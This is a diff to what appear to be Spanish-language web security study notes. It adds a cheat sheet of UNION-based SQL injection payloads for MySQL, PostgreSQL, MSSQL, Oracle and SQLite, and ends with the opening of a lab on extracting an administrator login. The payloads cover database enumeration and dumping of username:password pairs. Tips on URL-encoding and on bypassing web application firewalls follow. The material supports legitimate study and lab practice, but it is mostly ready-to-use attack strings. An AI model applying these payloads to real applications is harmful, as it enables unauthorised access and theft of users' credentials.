@@ -394,3 +394,299 @@ Confirmamos en que campo se puede escribir, y además confirmamos que la base de
 4. Probamos a exfiltrar tipo y version de base de datos con `version()`
 
 ![Exfiltracion exitosa de version de base de datos](./images/SQLI21.png)
+
+### Cheat sheet: enumeración completa vía UNION SQL injection
+
+Una vez confirmada la inyección y determinado el número de columnas, `UNION SELECT` permite **anexar una segunda consulta** cuyos resultados se muestran junto con los de la consulta original. El flujo de enumeración es siempre el mismo:
+
+1. **Información básica**: versión, usuario actual, base de datos actual.
+2. **Esquemas / bases de datos**: listar los contenedores disponibles.
+3. **Tablas**: listar las tablas del esquema o base de datos de interés.
+4. **Columnas**: listar las columnas de la tabla objetivo.
+5. **Datos**: extraer los valores de las columnas de interés.
+
+A continuación se detalla cada paso para cada motor. Los payloads asumen que la consulta original tiene **N columnas** y que la **primera columna es de texto** y se refleja en la respuesta; ajusta los `NULL` y la posición del dato según corresponda.
+
+#### Tabla resumen: funciones de agregación de cadenas
+
+Cuando una consulta devuelve varias filas y solo se dispone de una columna para mostrar resultados, se necesita una función que **concatene varias filas en una sola cadena**:
+
+| Motor | Función de agregación | Ejemplo |
+| :--- | :--- | :--- |
+| **MySQL / MariaDB** | `GROUP_CONCAT()` | `GROUP_CONCAT(table_name)` |
+| **PostgreSQL** | `STRING_AGG()` | `STRING_AGG(table_name, ',')` |
+| **MSSQL** | `STRING_AGG()` (2017+) o `FOR XML PATH` | `STRING_AGG(name, ',')` |
+| **Oracle** | `LISTAGG()` (11g+) | `LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name)` |
+| **SQLite** | `GROUP_CONCAT()` | `GROUP_CONCAT(tbl_name)` |
+
+---
+
+#### MySQL / MariaDB
+
+##### Información básica
+
+```sql
+' UNION SELECT @@version, NULL-- -
+' UNION SELECT user(), NULL-- -
+' UNION SELECT database(), NULL-- -
+```
+
+##### Esquemas / bases de datos
+
+```sql
+' UNION SELECT schema_name, NULL FROM information_schema.schemata-- -
+' UNION SELECT GROUP_CONCAT(schema_name), NULL FROM information_schema.schemata-- -
+```
+
+##### Tablas
+
+```sql
+-- Tablas de la base de datos actual
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = database()-- -
+
+-- Todas las tablas (todas las bases de datos)
+' UNION SELECT GROUP_CONCAT(table_name), NULL FROM information_schema.tables-- -
+
+-- Tablas de una base de datos concreta
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'NOMBRE_DB'-- -
+```
+
+##### Columnas
+
+```sql
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'-- -
+
+' UNION SELECT GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name = 'users'-- -
+```
+
+##### Extracción de datos
+
+```sql
+-- Una fila
+' UNION SELECT username, password FROM users LIMIT 1-- -
+
+-- Múltiples filas en una sola celda
+' UNION SELECT GROUP_CONCAT(username, 0x3a, password), NULL FROM users-- -
+
+-- Concatenación con CONCAT()
+' UNION SELECT CONCAT(username, ':', password), NULL FROM users-- -
+```
+
+---
+
+#### PostgreSQL
+
+##### Información básica
+
+```sql
+' UNION SELECT version(), NULL-- -
+' UNION SELECT current_user, NULL-- -
+' UNION SELECT current_database(), NULL-- -
+```
+
+##### Esquemas / bases de datos
+
+```sql
+' UNION SELECT datname, NULL FROM pg_database-- -
+' UNION SELECT STRING_AGG(datname, ','), NULL FROM pg_database-- -
+```
+
+##### Tablas
+
+```sql
+-- Esquema 'public' (el habitual)
+' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = 'public'-- -
+
+-- Alternativa con pg_tables
+' UNION SELECT tablename, NULL FROM pg_tables WHERE schemaname = 'public'-- -
+
+-- Todas las tablas en una sola celda
+' UNION SELECT STRING_AGG(table_name, ','), NULL FROM information_schema.tables WHERE table_schema = 'public'-- -
+```
+
+##### Columnas
+
+```sql
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'-- -
+
+' UNION SELECT STRING_AGG(column_name, ','), NULL FROM information_schema.columns WHERE table_name = 'users'-- -
+```
+
+##### Extracción de datos
+
+```sql
+-- Una fila
+' UNION SELECT username, password FROM users LIMIT 1-- -
+
+-- Múltiples filas (concatenación con || y STRING_AGG)
+' UNION SELECT STRING_AGG(username || ':' || password, ','), NULL FROM users-- -
+```
+
+---
+
+#### Microsoft SQL Server (MSSQL)
+
+##### Información básica
+
+```sql
+' UNION SELECT @@version, NULL-- -
+' UNION SELECT DB_NAME(), NULL-- -
+' UNION SELECT SYSTEM_USER, NULL-- -
+```
+
+##### Bases de datos
+
+```sql
+' UNION SELECT name, NULL FROM master..sysdatabases-- -
+' UNION SELECT STRING_AGG(name, ','), NULL FROM master..sysdatabases-- -
+```
+
+##### Tablas
+
+```sql
+-- Tablas de usuario de la base de datos actual
+' UNION SELECT name, NULL FROM sysobjects WHERE xtype = 'U'-- -
+
+-- Tablas de otra base de datos
+' UNION SELECT name, NULL FROM NOMBRE_DB..sysobjects WHERE xtype = 'U'-- -
+
+-- Alternativa con information_schema
+' UNION SELECT table_name, NULL FROM information_schema.tables-- -
+```
+
+##### Columnas
+
+```sql
+-- Columna por nombre de tabla
+' UNION SELECT name, NULL FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'users')-- -
+
+-- Alternativa con information_schema
+' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users'-- -
+```
+
+##### Extracción de datos
+
+```sql
+-- Una fila
+' UNION SELECT TOP 1 username, password FROM users-- -
+
+-- Múltiples filas con STRING_AGG (2017+)
+' UNION SELECT STRING_AGG(username + ':' + password, ','), NULL FROM users-- -
+
+-- Múltiples filas con FOR XML PATH (cualquier versión)
+' UNION SELECT (SELECT username + ':' + password + ',' FROM users FOR XML PATH('')), NULL-- -
+```
+
+---
+
+#### Oracle
+
+> **Recordatorio**: en Oracle **todo `SELECT` requiere `FROM`**. Para valores constantes se usa `FROM DUAL`.
+
+##### Información básica
+
+```sql
+' UNION SELECT banner, NULL FROM v$version-- -
+' UNION SELECT user, NULL FROM DUAL-- -
+' UNION SELECT global_name, NULL FROM global_name-- -
+```
+
+##### Esquemas / propietarios
+
+```sql
+' UNION SELECT DISTINCT owner, NULL FROM all_tables-- -
+' UNION SELECT LISTAGG(owner, ',') WITHIN GROUP (ORDER BY owner), NULL FROM (SELECT DISTINCT owner FROM all_tables)-- -
+```
+
+##### Tablas
+
+```sql
+' UNION SELECT table_name, NULL FROM all_tables-- -
+' UNION SELECT owner || '.' || table_name, NULL FROM all_tables-- -
+' UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name), NULL FROM all_tables-- -
+```
+
+##### Columnas
+
+```sql
+' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'-- -
+' UNION SELECT column_name, data_type FROM all_tab_columns WHERE table_name = 'USERS'-- -
+' UNION SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name), NULL FROM all_tab_columns WHERE table_name = 'USERS'-- -
+```
+
+##### Extracción de datos
+
+```sql
+-- Una fila (atención al rownum)
+' UNION SELECT username, password FROM users WHERE rownum = 1-- -
+
+-- Concatenación con ||
+' UNION SELECT username || ':' || password, NULL FROM users WHERE rownum = 1-- -
+
+-- Múltiples filas con LISTAGG (11g+)
+' UNION SELECT LISTAGG(username || ':' || password, ',') WITHIN GROUP (ORDER BY username), NULL FROM users-- -
+```
+
+---
+
+#### SQLite
+
+##### Información básica
+
+```sql
+' UNION SELECT sqlite_version(), NULL-- -
+' UNION SELECT sql, NULL FROM sqlite_master WHERE type = 'table'-- -
+```
+
+##### Esquema completo
+
+SQLite **no tiene `information_schema`**. Toda la metadata (tablas, índices, vistas, triggers) reside en `sqlite_master` (o `sqlite_schema`), y su columna `sql` almacena la sentencia `CREATE` original. Una sola consulta puede revelar la estructura completa:
+
+```sql
+-- Esquema completo (todas las sentencias CREATE)
+' UNION SELECT sql, NULL FROM sqlite_master-- -
+
+-- Solo tablas (excluyendo las internas de SQLite)
+' UNION SELECT sql, NULL FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'-- -
+```
+
+##### Tablas
+
+```sql
+' UNION SELECT name, NULL FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'-- -
+' UNION SELECT GROUP_CONCAT(name), NULL FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'-- -
+```
+
+##### Columnas
+
+```sql
+-- A partir de la sentencia CREATE almacenada
+' UNION SELECT sql, NULL FROM sqlite_master WHERE type = 'table' AND name = 'users'-- -
+
+-- Con pragma_table_info (SQLite 3.16+)
+' UNION SELECT GROUP_CONCAT(name), NULL FROM pragma_table_info('users')-- -
+```
+
+##### Extracción de datos
+
+```sql
+-- Una fila
+' UNION SELECT username, password FROM users LIMIT 1-- -
+
+-- Múltiples filas
+' UNION SELECT GROUP_CONCAT(username || ':' || password), NULL FROM users-- -
+```
+
+---
+
+#### Notas transversales
+
+- **Ajuste de columnas**: todos los payloads asumen una columna de texto en la primera posición. Si la columna reflejada es otra, mueve el dato a la posición correspondiente y rellena el resto con `NULL`.
+- **Comillas y comentarios**: el estilo de comentario `-- -` funciona en la mayoría de motores, pero en MySQL también puedes usar `#`. En MSSQL el comentario puede ser `--` sin espacio adicional.
+- **Límite de filas**: cuando la aplicación solo muestra la primera fila, usa `LIMIT 1` (MySQL, PostgreSQL, SQLite), `TOP 1` (MSSQL) o `WHERE rownum = 1` (Oracle) para controlar qué fila se devuelve.
+- **Codificación**: en entornos reales, los payloads deben URL-encodearse (espacios como `%20`, comillas como `%27`, etc.) si se envían por la URL.
+- **WAF**: si hay un firewall de aplicaciones web, pueden ser necesarios bypasses con comentarios inline (`/*!UNION*/`, `UN/**/ION`), cambios de mayúsculas o codificaciones alternativas.
+
+### Exfiltración de contenido de la base de datos (bases de datos, tablas, columnas, datos) de una base de datos no Oracle
+
+Para el siguiente laboratorio vamos a realizar una exfiltración de la base de datos para obtener información. El objetivo principal es obtener loguearse como el usuario **administrator**.
